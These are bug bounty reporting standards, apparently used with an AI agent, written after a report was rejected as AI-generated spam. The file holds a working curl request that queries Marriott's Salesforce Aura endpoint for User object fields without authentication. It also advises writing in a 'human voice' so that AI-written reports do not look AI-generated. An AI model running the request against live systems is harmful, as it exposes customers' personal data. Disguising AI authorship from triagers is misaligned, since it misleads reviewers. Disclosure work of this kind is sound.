# Reporting Standards — Marriott Bug Bounty
# Revised 2026-06-23 after M018 closed-as-Spam incident

## What went wrong with M018

HackerOne triager h1_analyst_decimo closed #3816825 as Spam:
"unvetted and unverified AI-generated content"

The finding WAS real. The report LOOKED AI-generated because:
- Polished prose, no raw evidence attached
- No verbatim curl command + response pasted in
- No screenshot of actual test terminal
- No researcher IP or timestamp
- No before/after differential showing the bug is real

Triager's own rule: "AI-assisted content is acceptable but must be accurately and manually
vetted." We need to prove the testing is real, not just describe what we found.

---

## Mandatory evidence checklist (ALL must be present before submitting)

### [ ] 1. Researcher metadata
Include at the top of every report:
```
Testing date: YYYY-MM-DD
Testing time: HH:MM UTC
Researcher IP: <your external IP — run: curl ifconfig.me>
Test environment: Raspberry Pi 5, curl 7.x, Python 3.x
Marriott Bonvoy test account: <your account number if used>
```

### [ ] 2. One-liner reproduction command
Every report MUST include an exact curl command that anyone can copy-paste and run.
No pseudocode. No placeholder values. The exact command used.

```bash
# GOOD:
curl -s -X POST 'https://target.com/ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'module=user&function=list&data={}'

# BAD:
# "Send a POST request to /ajax.php with the module and function parameters..."
```

### [ ] 3. Verbatim HTTP response
Paste the actual HTTP response body verbatim. Not a description — the actual bytes.

```
# GOOD:
Fatal error: Uncaught TypeError: json_decode(): Argument #1 ($json) must be of type
string, array given in /FranLic/www/html/lib/internal/request.inc.php:233
...

# BAD:
# "The response contains a PHP fatal error with the absolute server path."
```

### [ ] 4. HTTP status code + response size
State the exact status code and body size from the actual response.
```
Response: HTTP 200, 431 bytes
```

### [ ] 5. Before/after differential
Every auth bypass / IDOR needs a CONTRAST — what happens without the bug vs. with it.

```
WITHOUT bug (expected, secure behavior):
  curl ... -d 'module=applications_v2&function=prelogin'
  → HTTP 200, 93B: {"html":false,"data":false,...}

WITH bug (actual, insecure behavior):
  curl ... -d 'module=user&function=list&data={}'  
  → HTTP 200, 431B: Fatal error: json_decode(Array)...
```

### [ ] 6. Screenshot requirement
At minimum ONE screenshot showing:
- The actual terminal window
- The curl command as typed/run
- The response output visible

For Pi-based testing: save a screenshot of the terminal session showing the finding.
Can also use `script` command to capture a session transcript.

### [ ] 7. Human voice, first-person writing
Write in first person. Avoid formal AI-sounding prose.

```
# GOOD:
"On June 22, I tested the /ajax.php endpoint on my Raspberry Pi 5 by sending POST
requests with different module/function combinations. I discovered that module=user
and function=list bypasses the authentication check..."

# BAD:
"The vulnerability exists due to improper authentication validation in the PHP
application's routing logic, which allows unauthenticated actors to..."
```

---

## Report template

Use this template for every new submission:

```
## Summary

[1-2 sentences, direct. What is the bug? What does an attacker get?]

I found that [target endpoint] allows unauthenticated access to [specific function].
Sending [specific request] returns [specific sensitive data/behavior] without any
session cookie or authentication token.

## Testing details

- Date tested: YYYY-MM-DD
- Time: HH:MM UTC  
- My external IP: [run: curl ifconfig.me]
- Tool: curl [version]
- Platform: Raspberry Pi 5, ARM64, Ubuntu/Debian

## Steps to reproduce

1. Send the following request (no session cookie needed):

[VERBATIM CURL COMMAND]

2. Observe the response:

[VERBATIM RESPONSE BODY]

3. Compare with a normal (non-bypassing) request:

[CONTRAST CURL COMMAND]
→ [CONTRAST RESPONSE — showing expected secure behavior]

## Evidence

[ATTACH: terminal screenshot showing the actual test]
[ATTACH: raw response body if too long to paste inline]

## Impact

[Concrete, specific impact. What data/access does this expose?]
[Avoid: "This could allow attackers to potentially..." — instead state what you observed]

## CVSS

[Score and vector string]
```

---

## Evidence collection during Pi runbooks

**Add to every runbook:** Before testing any potential finding, save the raw evidence:

```bash
# Save raw request + response for every key test
curl -v -s -X POST 'https://target.com/endpoint' \
  -d 'payload' \
  -o /tmp/evidence-$(date +%s)-response-body.txt \
  -D /tmp/evidence-$(date +%s)-response-headers.txt \
  2>/tmp/evidence-$(date +%s)-verbose.txt
  
# Save a timestamped evidence bundle
tar czf /tmp/evidence-$(date +%Y%m%d-%H%M%S).tar.gz /tmp/evidence-*.txt
```

**Screenshot the terminal** showing the finding before moving to the next test.
A photo of the Pi monitor is acceptable if no screenshot tool is available.

---

## M002 (#3817499) — at-risk assessment

M002 (Salesforce Aura Guest User exposure) has the same risk:
- Report was AI-written
- No raw curl output attached
- No screenshot of actual Aura API response

**If M002 gets flagged as Spam, the appeal evidence is:**
```bash
# The reproduction command that proves it:
curl -s -X POST 'https://cpp.marriott.com/s/sfsites/aura' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'message={"actions":[{"id":"1","descriptor":"ui-object-info-api/objectInfoController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"[fwuid]","app":"siteforce:communityApp","dn":[],"globals":{},"uad":false}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined'
  
# Expected if vulnerable: "state":"SUCCESS" with 203 User object fields
# Expected if not vulnerable: "state":"ERROR" ACCESS_DENIED
```

Actual result from Pi testing: `"state":"SUCCESS"` with 203 fields including Email,
FirstName, Address, CommunityNickname, CompanyName, HasUserVerifiedEmail, Phone, MobilePhone.

---

## Scope of this change

These standards apply to ALL future bug bounty submissions across all programs.
Update CLAUDE.md Section 9 "Definition of Done" to require evidence checklist before
a finding is considered report-ready.
